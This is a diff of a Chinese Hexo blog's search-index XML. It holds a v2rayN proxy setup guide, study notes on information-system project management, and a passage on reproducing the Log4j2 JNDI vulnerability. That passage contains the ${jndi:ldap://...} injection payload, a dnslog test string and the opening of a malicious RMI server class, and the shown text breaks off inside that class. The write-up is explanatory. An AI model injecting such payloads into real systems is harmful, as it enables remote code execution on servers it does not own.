+<p>不过早在11月24日，阿里云就监测到了在野攻击并给apache报告了，只是apache新出的版本只是拦截了ldap，其他协议依旧有效。所以公开后很快被腾讯团队测试可绕过，当天发出修复版本Log4j 2.15.0-rc2</p>
 ]]></content>
-      <categories>
-        <category>hexo</category>
-      </categories>
       <tags>
-        <tag>blog</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>使用v2rayN免费科学上网</title>
-    <url>/2021/11/14/%E4%BD%BF%E7%94%A8v2rayN%E5%85%8D%E8%B4%B9%E7%A7%91%E5%AD%A6%E4%B8%8A%E7%BD%91/</url>
-    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>重要的事情说三遍：</p>
-<ul>
-<li>仅供学习用途，请勿非法使用! </li>
-<li>仅供学习用途，请勿非法使用! </li>
-<li>仅供学习用途，请勿非法使用! </li>
-</ul>
-<h2 id="V2rayN使用"><a href="#V2rayN使用" class="headerlink" title="V2rayN使用"></a>V2rayN使用</h2><h3 id="下载地址："><a href="#下载地址：" class="headerlink" title="下载地址："></a>下载地址：</h3><p>直接上链接：</p>
-<blockquote>
-<p>windows: <a href="https://github.com/2dust/v2rayN/releases/latest">v2rayN · GitHub</a>，访问不了Github的看<a href="https://hackt0.github.io/2021/11/09/解决github访问失败/">解决github访问失败 | Hackt0’s Blog</a>，觉得下载慢的我下载了一份4.20版本的放在<a href="https://www.lanzouw.com/iglZHwgmzje">v2rayN_v4.20</a></p>
-<p>Android: <a href="https://github.com/2dust/v2rayNG/releases/tag/1.6.23">v2rayNG · GitHub</a>，觉得下载慢的同样也下载了一份1.6.23版本在<a href="https://pan.lanzoui.com/idYLUwgmzmh?w">v2rayNG_1.6.23.apk</a></p>
-</blockquote>
-<h3 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h3><p>解压后运行v2rayN.exe，打开选项<code>订阅——设置订阅</code><br><img src="https://i.loli.net/2021/11/10/y8Ul4ZAJK2WE67R.png" alt="49c2f0a9d2c8c5655cbbe637872d107.png"></p>
-<p>地址填<code>https://raw.fastgit.org/freefq/free/master/v2</code>，备注随意，然后点击添加即可<br><img src="https://i.loli.net/2021/11/10/5gCvrDL1pxPjtsV.png" alt="b68fa6ac30e2d4095de6cc74d625242.png"></p>
-<p>再到主界面打开选项<code>订阅————刷新订阅</code>，这是就能看到地址列表了，全选后右键测速<br><img src="https://i.loli.net/2021/11/10/WJlkafCPohuqHg6.png" alt="edeb55c10106670ad80a94a5d1df612.png"></p>
-<p>选择网速最快的地址右键设为活动服务器即可<br><img src="https://i.loli.net/2021/11/10/Btwf7XOGmySYIds.png" alt="826097485a238b800b29ab02eb615a5.png"></p>
-<p>最后桌面右下角托盘打开系统代理，红色即为开启<br><img src="https://i.loli.net/2021/11/10/4PltaK6NY5HjJLA.png" alt="10e919246046b6d8c3a51abfcb8da60.png"></p>
-<p>手机使用方法一致，添加相同规则即可。</p>
-]]></content>
-      <categories>
-        <category>工具</category>
-      </categories>
-      <tags>
-        <tag>VPN</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>信息系统项目管理基础</title>
-    <url>/2022/03/29/%E4%BF%A1%E6%81%AF%E7%B3%BB%E7%BB%9F%E9%A1%B9%E7%9B%AE%E7%AE%A1%E7%90%86%E5%9F%BA%E7%A1%80/</url>
-    <content><![CDATA[<h3 id="项目管理基础"><a href="#项目管理基础" class="headerlink" title="项目管理基础"></a>项目管理基础</h3><h4 id="项目的概念"><a href="#项目的概念" class="headerlink" title="项目的概念"></a>项目的概念</h4><p>&emsp;&emsp;项目是为提供一项独特产品、服务或成果所做的临时性努力</p>
-<h4 id="项目的特点"><a href="#项目的特点" class="headerlink" title="项目的特点"></a>项目的特点</h4><p>项目的特点主要表现在以下几个方面：</p>
-<ol>
-<li>临时性(一次性)：临时性是指每一个项目都有确定的开始和结束日期</li>
-<li>独特的产品、服务或成果：项目创造独特的可交付成果，如产品、服务或成果</li>
-<li>逐步完善：逐步完善是项目伴随临时性和独特性两个概念的特点之一。逐步意味着分步、连续和积累。</li>
-<li>资源约束：每一个项目都需要具备各种资源来作为实施的保证，而资源是有限的。所以，资源成本是项目成功实施的一个约束条件。</li>
-<li>目的性：项目工作的目的在于得到特定的结果，即项目是面向目标的</li>
-</ol>
-<p>项目的四个约束：</p>
-<p>&emsp;&emsp;时间、成本和质量是项目工作的三个主要目标， 为取得项目的成功， 必须同时考虑时间、成本和质量三个因素， 这三个目标经常存在冲突。另一个主要的约束是项目的范围。项目经理的责任就是在四个要素之间进行权衡以保证项目成功。</p>
-<h4 id="项目与日常运作的关系"><a href="#项目与日常运作的关系" class="headerlink" title="项目与日常运作的关系"></a>项目与日常运作的关系</h4><p>无重要考点</p>
-<h4 id="项目和战略规划"><a href="#项目和战略规划" class="headerlink" title="项目和战略规划"></a>项目和战略规划</h4><p>战略管理包括以下三个过程：</p>
-<ol>
-<li>战略制定： 确定企业任务， 认定企业的外部机会与威胁，认定企业内部优势与弱点， 建立长期目标， 制定供选择战略， 以及选择特定的实施战略。</li>
-<li>战略实施：树立年度目标、制定政策、激励员工和配置资源， 以便使制定的战略得以贯彻执行。</li>
-<li>战略评价：重新审视外部与内部因素；度量业绩；采取纠偏措施。</li>
-</ol>
-<p>&emsp;&emsp;对于典型的项目型企业， 一般在企业的战略实施过程中， 将<strong>企业的战略转化为一系列的项目</strong>来实施企业的战略， 按多项目或项目群来管理各个项目， 达到企业的战略目标。—个优秀的项目经理应该了解企业的商业战略目标， 与企业高层管理者紧密合作。</p>
-<h4 id="信息系统项目的特点"><a href="#信息系统项目的特点" class="headerlink" title="信息系统项目的特点"></a>信息系统项目的特点</h4><p>&emsp;&emsp;典型的信息系统项目有如下特点：</p>
-<pre><code>目标不明确。
-需求变化频繁。
-智力密集型。
-设计队伍庞大。
-设计人员高度专业化。
-涉及的承包商多。
-各级承包商分布在各地， 相互联系复杂。
-系统集成项目中需研制开发大量的软硬件系统。
-项目生命期通常较短。
-通常要采用大量的新技术。
-使用与维护的要求非常复杂。
-</code></pre><h4 id="项目管理的定义"><a href="#项目管理的定义" class="headerlink" title="项目管理的定义"></a>项目管理的定义</h4><p>&emsp;&emsp;项目管理就是把各种知识、技能、手段和技术应用千项目活动之中， 以达到项目的要求。项目管理是通过应用和综合诸如<strong>启动、计划、实施、监控和收尾</strong>等项目管理过程来进行的。</p>
-<h4 id="项目管理的特点"><a href="#项目管理的特点" class="headerlink" title="项目管理的特点"></a>项目管理的特点</h4><p>无重要考点</p>
-<h3 id="项目管理知识体系构成"><a href="#项目管理知识体系构成" class="headerlink" title="项目管理知识体系构成"></a>项目管理知识体系构成</h3><h4 id="项目管理知识体系"><a href="#项目管理知识体系" class="headerlink" title="项目管理知识体系"></a>项目管理知识体系</h4><p>无重要考点</p>
-<h4 id="应用领域的知识、标准和规定"><a href="#应用领域的知识、标准和规定" class="headerlink" title="应用领域的知识、标准和规定"></a>应用领域的知识、标准和规定</h4><p>无重要考点</p>
-<h4 id="理解项目环境"><a href="#理解项目环境" class="headerlink" title="理解项目环境"></a>理解项目环境</h4><p>无重要考点</p>
-<h4 id="一般的管理知识技能"><a href="#一般的管理知识技能" class="headerlink" title="一般的管理知识技能"></a>一般的管理知识技能</h4><p>无重要考点</p>
-<h4 id="软技能"><a href="#软技能" class="headerlink" title="软技能"></a>软技能</h4><p>(三、四年考一分)软技能包括人际关系管理。软技能包含以下内容:</p>
-<ol>
-<li>有效的沟通： 信息交流。</li>
-<li>影响—个组织： “让事情办成＂ 的能力。</li>
-<li>领导能力： 形成—个前景和战略并组织人员达到它。</li>
-<li>激励：激励人员达到高水平的生产率并克服变革的阻力。</li>
-<li>谈判和冲突管理： 与其他人谈判或达成协议。</li>
-<li>问题解决： 问题定义和做出决策的结合。</li>
-</ol>
-<h3 id="IPMP-PMP"><a href="#IPMP-PMP" class="headerlink" title="IPMP/PMP"></a>IPMP/PMP</h3><p>无重要考点</p>
-<h3 id="PRINCE2"><a href="#PRINCE2" class="headerlink" title="PRINCE2"></a>PRINCE2</h3><h4 id="PRINCE2-定义与结构"><a href="#PRINCE2-定义与结构" class="headerlink" title="PRINCE2 定义与结构"></a>PRINCE2 定义与结构</h4><p>&emsp;&emsp;PRINCE2提供最佳的项目管理方法论， 更加接近项目的实施， 更加重视项目的实际收益和回报。</p>
-<p>&emsp;&emsp;PRINCE2是一种基于流程的结构化项目管理方法。</p>
-<p>&emsp;&emsp;PRINCE2旨在以—种适千广泛项目环境的方式组织安排和着重介绍项目管理知识。</p>
-<p>&emsp;&emsp;PRINCE2假设了解和采用该方法的用户具有—定的经验， 能够自行填补其省略的细节。</p>
-<p>&emsp;&emsp;PRINCE2包括4个被称为要素的主要部分。 这4个要素包括<strong>原则、 流程、 主题以及项目环境</strong>。</p>
-<h4 id="PRINCE2-原则"><a href="#PRINCE2-原则" class="headerlink" title="PRINCE2 原则"></a>PRINCE2 原则</h4><p>&emsp;&emsp;（不要求看）PRINCE2方法具有七个原则：</p>
-<pre><code>持续业务验证
-吸取经验教训
-明确定义的角色和职责
-按阶段管理
-例外管理
-关注产品——由于成功的项目是以产出（而非活动）为导向
-根据项目环境剪裁——认识到项目管理没有严格（精确）的公式
-</code></pre><h3 id="组织结构对项目的影响"><a href="#组织结构对项目的影响" class="headerlink" title="组织结构对项目的影响"></a>组织结构对项目的影响</h3><h4 id="组织体系"><a href="#组织体系" class="headerlink" title="组织体系"></a>组织体系</h4><p>无重要考点</p>
-<h4 id="组织的文化与风格"><a href="#组织的文化与风格" class="headerlink" title="组织的文化与风格"></a>组织的文化与风格</h4><p>&emsp;&emsp;（不重要）组织文化常常会对项目产生直接的影响。例如：</p>
-<pre><code>在一个进取心较强或具有开拓精神的组织中， 团队所提出的非常规的或高风险性的建议更容易获得批准。
-在一个等级制度严格的组织中， —个喜欢高度参与的项目经理可能经常会遇到麻烦。而在一个很民主的组织中， 一个喜欢独裁的项目经理同样也会受到挑战。
-</code></pre><h4 id="组织结构"><a href="#组织结构" class="headerlink" title="组织结构"></a>组织结构</h4><p>&emsp;&emsp;<font color="red">与项目有关的主要企业组织结构类型的关键特征：</font></p>
-<p><img src="https://s2.loli.net/2022/03/29/WsgLfOpcSNQvUMX.png" alt="image-20220329173732284"></p>
-<p>&emsp;&emsp;1. <font color="red">职能型组织的优点体现在如下方面：</font></p>
-<pre><code>- 强大的技术支持，便于知识、技能和经验的交流
-- 清晰的职业生涯晋升路线
-- 直线沟通、交流简单、责任和权限很清晰
-- 有利于重复性工作为主的过程管理
-</code></pre><p>&emsp;&emsp;<font color="red">同时，职能型组织也存在着如下缺点：职能利益优先于项目，具有狭隘性；组织横向之间的联系薄弱、部门间沟通、协调难度大；项目经理极少或缺少权力、权威；项目管理发展方向不明，缺少项目基准等。</font></p>
-<p>&emsp;&emsp;2. <font color="red">项目型组织的优点体现在如下方面：</font></p>
-<pre><code>- 结构单一，责权分明，利于统一指挥
-- 目标明确单一
-- 沟通简洁、方便
-- 决策快
-</code></pre><p>&emsp;&emsp;<font color="red">同时，项目型组织也存在着如下缺点：管理成本过高，如项目的工作量不足则资源配置效率低；项目环境比较封闭，不利于沟通、技术知识等共享；员工缺乏事业上的连续型和保障等。</font></p>
-<p>&emsp;&emsp;3. 矩阵型组织的优点体现在如下方面：</p>
-<pre><code>- 项目经理负责制、有明确的项目目标
-- 改善了项目经理对整体资源的控制
-- 及时响应
-- 获得职能组织更多的支持
-- 最大限度地利用公司的稀缺资源
-- 降低了跨职能部门间的协调合作难度
-- 使质量、成本、时间等制约因素得到更好的平衡
-- 团队成员有归属感，士气高，问题少。
-- 出现的冲突较少，且易处理解决
-</code></pre><p>&emsp;&emsp;<font color="red">同时，矩阵型组织也存在着如下缺点：管理成本增加；多头领导；难以监测和控制；资源分配与项目优先的问题产生冲突；权力难以保持平衡等。</font></p>
-<p>&emsp;&emsp;<font color="red">以下五种图必须要能区分</font></p>
-<p><img src="https://s2.loli.net/2022/03/29/mZO5fw6c1UESMyK.png" alt="image-20220329185209272"></p>
-<p><img src="https://s2.loli.net/2022/03/29/NobHpM4cKO8PzfX.png" alt="image-20220329185302964"></p>
-<p><img src="https://s2.loli.net/2022/03/29/TK43lu85VzEfNQP.png" alt="image-20220329185351266"></p>
-<p><img src="https://s2.loli.net/2022/03/29/VX49j7ZAKmdFufE.png" alt="image-20220329185425806"></p>
-<p><img src="https://s2.loli.net/2022/03/29/oRy7HA1eFk2NjG3.png" alt="image-20220329185508116"></p>
-<h4 id="PMO在组织结构中的作用"><a href="#PMO在组织结构中的作用" class="headerlink" title="PMO在组织结构中的作用"></a>PMO在组织结构中的作用</h4><p>&emsp;&emsp;根据需要，可以为一个项目设立一个PMO(Project Management Office 项目管理办公室)，可以为一个部门设立一个PMO，也可以为一个企业设立一个PMO，这三级PMO可以在组织内同时存在。</p>
-<p>&emsp;&emsp;（中级考过案例分析）以下列出PMO的一些关键特征，但不限于此：</p>
-<pre><code>1. 在所有PMO管理的项目之间共享和协调资源
-2. 明确和制定项目管理的方法、最佳实践和标准
-3. 负责制订项目方针、流程、模板和其他共享
-4. 为所有项目进行集中的配置管理
-5. 对所有项目的集中的共同风险和独特风险存储库加以管理
-6. 项目工具（如企业级项目管理软件）的实施和管理中心
-7. 项目之间的沟通管理协调中心
-8. 对项目经理进行指导的平台
-9. 通常对所有PMO管理的项目的时间基线和预算进行集中监控
-10. 在项目经理和任何内部或外部的质量人员或标准化组织之间协调整体项目的质量标准
-</code></pre><h3 id="信息系统项目的生命周期"><a href="#信息系统项目的生命周期" class="headerlink" title="信息系统项目的生命周期"></a>信息系统项目的生命周期</h3><h4 id="项目生命周期的基础"><a href="#项目生命周期的基础" class="headerlink" title="项目生命周期的基础"></a>项目生命周期的基础</h4><p>无重要考点</p>
-<h4 id="项目生命周期的特征"><a href="#项目生命周期的特征" class="headerlink" title="项目生命周期的特征"></a>项目生命周期的特征</h4><p>&emsp;&emsp;成本与人力投入在开始时较低， 在工作执行期间达到最高， 并在项目快要结束时迅速回落。</p>
-<p><img src="https://s2.loli.net/2022/03/29/2jFWzktMnT9ylm8.png" alt="image-20220329191125399"></p>
-<p>&emsp;&emsp;（干系人对项目的影响同）风险与不确定性在项目开始时最大， 并在项目的整个生命周期中随着决策的制定与可交付成果的验收而逐步降低。</p>
-<p>&emsp;&emsp;做出变更和纠正错误的成本， 随着项目越来越接近完成而显著增高。</p>
-<p><img src="https://s2.loli.net/2022/03/29/z6LHBky4p5GOdtr.png" alt="image-20220329191240805"></p>
-<h4 id="项目阶段"><a href="#项目阶段" class="headerlink" title="项目阶段"></a>项目阶段</h4><p>&emsp;&emsp;项目阶段是一组具有逻辑关系的项目活动的集合，通常以一个或多个可交付成果的完成为结束。</p>
-<p>&emsp;&emsp;阶段与阶段的关系有两种基本类型：(1) 顺序关系。(2)交叠关系。 </p>
-<h3 id="信息系统项目典型生命周期模型"><a href="#信息系统项目典型生命周期模型" class="headerlink" title="信息系统项目典型生命周期模型"></a>信息系统项目典型生命周期模型</h3><h4 id="瀑布模型"><a href="#瀑布模型" class="headerlink" title="瀑布模型"></a>瀑布模型</h4><p>&emsp;&emsp;<font color="red">瀑布模型是—个经典的软件生命周期模型，—般将软件开发分为： 可行性分析（计划）、需求分析、软件设计（概要设计、详细设计）、编码（含单元测试）、测试、运行维护等几个阶段</font></p>
-<p>&emsp;&emsp;<font color="red">（瀑布<strong>模型</strong>与结构化<strong>方法</strong>相同（若需求明确，一步一步往下做，并且每个阶段进行评审））</font></p>
-<p><img src="https://s2.loli.net/2022/03/29/pV21nJH74LwjBTy.png" alt="image-20220329192045208"></p>
-<font color="red">瀑布模型的特点：</font>
-
-<ol>
-<li><font color="red">从上一项开发活动接受该项活动的工作对象作为输入。</font>
-</li>
-<li><font color="red">利用这一输入， 实施该项活动应完成的工作内容。</font>
-</li>
-<li><font color="red">给出该项活动的工作成果， 作为输出传给下一项开发活动。</font>
-
-<font color="red">（即上一个过程的输出为下一个过程的输入）</font>
-</li>
-<li><font color="red">对该项活动的实施工作成果进行评审。 若其工作成果得到确认， 则继续进行下—项开发活动； 否则返回前—项， 甚至更前项的活动。 尽量减少多个阶段间的反复。 以相对来说较小的费用来开发软件。</font>
-
-</li>
-</ol>
-<h4 id="螺旋模型"><a href="#螺旋模型" class="headerlink" title="螺旋模型"></a>螺旋模型</h4><p>&emsp;&emsp;螺旋模型是一个演化软件过程模型， 将<strong>原型实现的迭代特征与线性顺序（瀑布）模型</strong>中控制的和系统化的方面结合起来。</p>
-<p>&emsp;&emsp;<font color="red">四个象限分别标志每个周期所划分的四阶段： 制订计划、风险分析、实施工程和客户评估。螺旋模型强调了<strong>风险分析</strong>， 特别适用于<strong>庞大而复杂的、高风险的系统</strong>。</font></p>
-<p><img src="C:/Users/15502/AppData/Roaming/Typora/typora-user-images/image-20220329192916329.png" alt="image-20220329192916329"></p>
-<h4 id="迭代模型"><a href="#迭代模型" class="headerlink" title="迭代模型"></a>迭代模型</h4><p>&emsp;&emsp;迭代式开发模型， 如图2-14所示，<font color="red"> 水平方向为时间维， 从组织管理的角度描述整个软件开发生命周期 ， 分四个阶段：初始、 细化、 构造、 移交， 可进—步描述为周期(Cycle)、阶段(Phase)、 迭代(Iteration)；</font>核心工作流从技术角度描述迭代模型的静态组成部分，包括： <strong>业务建模、 需求获取、 分析与设计、 实现、 测试、 部署</strong>。 图中的阴影部分描述了不同的工作流， 在不同的时间段内工作量的不同， <font color="red">几乎所有的<strong>工作流在所有的时间段内均有工作量， 只是大小不同而已</strong>。(即反复迭代)</font> 各阶段的主要任务如下：</p>
-<pre><code>初始阶段：系统地阐述项目的范围 ， 选择可行的系统构架， 计划和准备业务案例。
-细化阶段：细化构想， 细化过程和基础设施， 细化构架并选择构件。
-构造阶段：资源管理、 控制和过程最优化， 完成构件的开发并依评价标准进行测试， 依构想的验收标准评估产品的发布。
-移交阶段：同步并使并发的构造增量集成到一致的实施基线中，与实施有关的工程活动（商业包装和生产、人员培训等），根据完整的构想和需求集的验收标准评估实施基线。
-</code></pre><font color="red"> &emsp;&emsp;RUP强调软件开发是一个迭代模型</font>
-
-<p><img src="https://s2.loli.net/2022/03/29/SkR5NJeD8AQzMiK.png" alt="image-20220329193025465"></p>
-<h4 id="V模型"><a href="#V模型" class="headerlink" title="V模型"></a>V模型</h4><p>&emsp;&emsp;V模型从整体上看起来， 就是一个V字型的结构， 由左右两边组成。左边的下画线分别代表了需求分析、概要设计、详细设计、编码。右边的上画线代表了单元测试、集成测试、系统测试与验收测试</p>
-<p>V模型的特点：</p>
-<ul>
-<li>V模型体现的主要思想是开发和测试同等重要， 左侧代表的是开发活动， 而右侧代表的是测试活动。</li>
-<li><font color="red">模型针对每个开发阶段， 都有一个测试级别与之相对应。</font>
-1. <font color="red">单元测试的主要目的是针对编码过程中可能存在的各种错误</font>
-2. <font color="red">集成测试的主要目的是针对详细设计中可能存在的问题</font>
-3. <font color="red">系统测试主要针对概要设计，检查系统作为一个整体是否有效地得到运行</font>
-4. <font color="red">验收测试通常由业务专家或者用户进行，以确认产品能否真正符合用户业务上的需要</font>
-
-</li>
-</ul>
-<p><img src="https://s2.loli.net/2022/03/29/ESIwMpo3AO9TGlm.png" alt="image-20220329194622240"></p>
-<ul>
-<li>测试依旧是开发生命周期中的阶段， 与瀑布模型不同的是， 有多个测试级别与开发阶段对应。</li>
-<li><font color="red">V模型适用于需求明确和需求变更不频繁的情形。</font>
-
-</li>
-</ul>
-<h4 id="原型化模型"><a href="#原型化模型" class="headerlink" title="原型化模型"></a>原型化模型</h4><p>&emsp;&emsp;原型化模型第—步就是创建一个快速原型， 能够满足项目干系人与未来的用户可以与原型进行交互， 再通过与相关干系人进行充分的讨论和分析， 最终弄清楚当前系统的需求， 进行了充分的了解之后， 在原型的基础上开发出用户满意的产品。</p>
-<p>&emsp;&emsp;原型法用于很难—下子全面准确地提出用户需求的情况下</p>
-<p>原型应当具备的特点如下：</p>
-<pre><code>1. 实际可行。
-2. 具有最终系统的基本特征。
-3. 构造方便、快速，造价低。
-</code></pre><p>&emsp;&emsp;原型法的特点在于原型法对用户的需求是<strong>动态响应、逐步纳入</strong>的</p>
-<h4 id="敏捷开发模型"><a href="#敏捷开发模型" class="headerlink" title="敏捷开发模型"></a>敏捷开发模型</h4><p>&emsp;&emsp;（建议了解，非历年考试重点）敏捷开发是一种以人为核心、迭代、循序渐进的开发方法， 相对于传统软件开发方法的“ 非敏捷＂，更强调程序员团队与业务专家之间的紧密协作、面对面的沟通（认为比书面的文档更有效）、频繁交付新的软件版本、紧凑而自我组织型的团队、能够很好地适应需求变化的代码编写和团队组织方法， 也更注重软件开发中人的作用。</p>
-<p>&emsp;&emsp;Scrum是—种迭代式增量软件开发过程， 通常用千敏捷软件开发</p>
-<h3 id="单个项目的管理过程"><a href="#单个项目的管理过程" class="headerlink" title="单个项目的管理过程"></a>单个项目的管理过程</h3><p>&emsp;&emsp;项目管理就是将知识、技能、工具和技术应用于项目活动之中， 以满足项目的要求。它是通过利用项目管理知识、技能、工具和技术的过程实现的，这些过程凭借每个过程的输入条件创造出成果。</p>
-<p>&emsp;&emsp;<font color="red">项目管理各过程组成的5 个过程组可以对应到PDCA循环， 即戴明环： ”计划(Plan)—执行(Do)—检查(Check)—行动(Act)”循环。</font></p>
-<p>&emsp;&emsp;<font color="red">按项目管理过程在项目管理中的职能可以将组成项目的各个过程归纳为5组， 叫作项目管理过程组： (1)启动过程组；(2)计划过程组； (3)执行过程组；(4)监督与控制过程组；(5)收尾过程组</font></p>
-<ol>
-<li><font color="red">启动过程组定义并批准项目或项目阶段。包括**“ 制定项目章程” 和“ 识别项目干系人”** 两个过程。</font></li>
-<li><font color="red">计划过程组定义和细化目标， 并为实现项目而要达到的目标和完成项目要解决的问题范围而规划必要的行动路线。</font></li>
-<li><font color="red">执行过程组整合人员和其他资源， 在项目的生命期或某个阶段执行项目管理计划。</font></li>
-<li><font color="red">监督与控制过程组要求定期测量和监控项目绩效情况， 识别与项目管理计划的偏差，以便在必要时采取纠正措施，确保项目或阶段目标达成</font></li>
-<li><font color="red">收尾过程组正式验收产品、服务或工作成果，有序的结束项目或项目阶段。包括项目整体管理中的 **“ 结束项目或阶段“** 过程，项目采购管理中的 **“结束采购“** 过程。</font>
-
-</li>
-</ol>
-<h4 id="过程间的相互联系与交互作用"><a href="#过程间的相互联系与交互作用" class="headerlink" title="过程间的相互联系与交互作用"></a>过程间的相互联系与交互作用</h4><p>&emsp;&emsp;项目管理计划和项目范围说明书，并随着项目的绩效经常更新该项目管理计划。此外，过程组极少是孤立或只执行一次的事件，它们是在<strong>整个项目生命期内自始至终都以不同的程度互相重叠的活动。若将项目划分为阶段，则过程组不但在阶段内，而且也可能跨越阶段相互影响和相互作用。</strong></p>
-<p><img src="https://s2.loli.net/2022/03/29/LjreGtKoVgyW7a1.png" alt="image-20220329201103195"></p>
-]]></content>
-      <categories>
-        <category>软考</category>
-      </categories>
-      <tags>
-        <tag>Textual Criticism</tag>
+        <tag>漏洞复现</tag>
       </tags>
   </entry>
   <entry>
@@ -1151,47 +970,228 @@ IGMP允许Internet中的计算机参加多播， 是计算机用做向相邻多�
       </tags>
   </entry>
   <entry>
-    <title>log4j 2漏洞原理及复现</title>
-    <url>/2021/12/13/%E6%A0%B8%E5%BC%B9%E7%BA%A7!log4j%202%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%8F%8A%E5%A4%8D%E7%8E%B0/</url>
-    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>被log4j2漏洞刷频了，公司也是紧急修复了一波，现在来整个盘一下这个漏洞到底是什么原理！测试漏洞的人太多，连dnslog很长一段时间都访问不了，最后还用的ceye测试复现的。</p>
-<div class="tabs" id="influence"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#influence-1">影响版本</button></li><li class="tab"><button type="button" data-href="#influence-2">影响范围</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="influence-1"><p><strong>Apache Log4j 2.x&lt;=2.15.0.rc1</strong></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="influence-2"><p>Spring-Boot-strater-log4j2Apache<br>Struts2Apache<br>SolrApache<br>FlinkApache<br>DruidElasticSearch<br>Flume<br>Dubbo<br>Redis<br>Logstash<br>Kafka<br>vmvare</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div>
-<h1 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h1><h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>最主要的漏洞成因就是下面这张图了，log4j2提供的lookup功能</p>
-<p><img src="https://s2.loli.net/2021/12/13/7C3zoiVgf1Tjq2B.jpg" alt="log4j2.jpg"></p>
-<p>日志中包含 <code>$&#123;&#125;</code>,lookup功能就会将表达式的内容替换为表达式解析后的内容，而不是表达式本身。log4j 2将基本的解析都做了实现：<br><div class="tabs" id="lookup"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#lookup-1">实例</button></li><li class="tab"><button type="button" data-href="#lookup-2">支持类型</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="lookup-1"><p>比如常见的用户登陆日志记录</p>
-<p><img src="https://s2.loli.net/2021/12/13/FbTqPux3Ydn9SzE.png" alt="lookup.png"></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="lookup-2"><blockquote>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$&#123;ctx:loginId&#125;</span><br><span class="line">$&#123;map:type&#125;</span><br><span class="line">$&#123;filename&#125;</span><br><span class="line">$&#123;date:MM-dd-yyyy&#125;</span><br><span class="line">$&#123;docker:containerId&#125;$&#123;docker:containerName&#125;</span><br><span class="line">$&#123;docker:imageName&#125;</span><br><span class="line">$&#123;env:USER&#125;</span><br><span class="line">$&#123;event:Marker&#125;</span><br><span class="line">$&#123;mdc:UserId&#125;</span><br><span class="line">$&#123;java&#125;</span><br><span class="line">$&#123;jndi:logging/context-name&#125;</span><br><span class="line">$&#123;hostName&#125;</span><br><span class="line">$&#123;docker:containerId&#125;</span><br><span class="line">$&#123;k8s&#125;</span><br><span class="line">$&#123;log4j&#125;</span><br><span class="line">$&#123;main&#125;</span><br><span class="line">$&#123;name&#125;</span><br><span class="line">$&#123;marker&#125;</span><br><span class="line">$&#123;spring&#125;</span><br><span class="line">$&#123;sys:logPath&#125;</span><br><span class="line">$&#123;web:rootDir&#125;</span><br></pre></td></tr></table></figure>
-</blockquote><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div></p>
-<p>而其中的JNDI（Java Naming and Directory Interface）就是本次的主题了，就是提供一个目录系统，并将服务与对象关联起来，可以使用名称来访问对象。而log4j 2中JNDI解析未作限制，可以直接访问到远程对象，如果是自己的服务器还好说，那如果访问到黑客的服务器呢？</p>
-<p>也就是当记录日志的一部分是用户可控时，就可以构造恶意字符串使服务器记录日志时调用JNDI访问恶意对象，也就是流传出的payload构成：</p>
-<p>${jndi:ldap:xxx.xxx.xxx.xxx:xxxx/exp}</p>
-<p>我们可以将上面日志记录的代码简单修改一下，假设用户名是从外部获取的用户输入，此时构建一个恶意用户名<code>$&#123;jndi:ladp://z2xcu7.dnslog.cn/exp&#125;</code>，然后触发日志记录(可以借助DNSLog生成临时域名用于查看测试是否生效）</p>
-<p><img src="https://s2.loli.net/2021/12/14/DqpwP4NmOai1YQj.png" alt="ldap.png"></p>
-<p>可以看到，记录日志时发起了JNDI解析，访问了DNS提供的域名并生成记录</p>
-<h2 id="攻击流程"><a href="#攻击流程" class="headerlink" title="攻击流程"></a>攻击流程</h2><p>其实JNDI通过SPI（Service Provider Interface）封装了多个协议，包括LDAP、RMI、DNS、NIS、NDS、RMI、CORBA；</p>
-<p>复现选择了使用RMI服务，搭建较为快速</p>
-<p>攻击思路（文章中使用的jdk1.8）：</p>
-<h3 id="找到目标服务器记录日志的地方，且记录的部分内容可控"><a href="#找到目标服务器记录日志的地方，且记录的部分内容可控" class="headerlink" title="找到目标服务器记录日志的地方，且记录的部分内容可控"></a>找到目标服务器记录日志的地方，且记录的部分内容可控</h3><p>我们还是选择之前的模拟日志记录，假设站点会记录用户登陆日志，实际上大部分网站确实会做相关功能</p>
-<h3 id="搭建RMI服务端，包含需要执行的恶意代码"><a href="#搭建RMI服务端，包含需要执行的恶意代码" class="headerlink" title="搭建RMI服务端，包含需要执行的恶意代码"></a>搭建RMI服务端，包含需要执行的恶意代码</h3><p>RMI服务端搭建，监听本地8888（自定义）端口，用Reference类引用恶意对象</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> server;</span><br><span class="line"><span class="keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;</span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Reference;</span><br><span class="line"><span class="keyword">import</span> java.rmi.AlreadyBoundException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RMIServer</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> 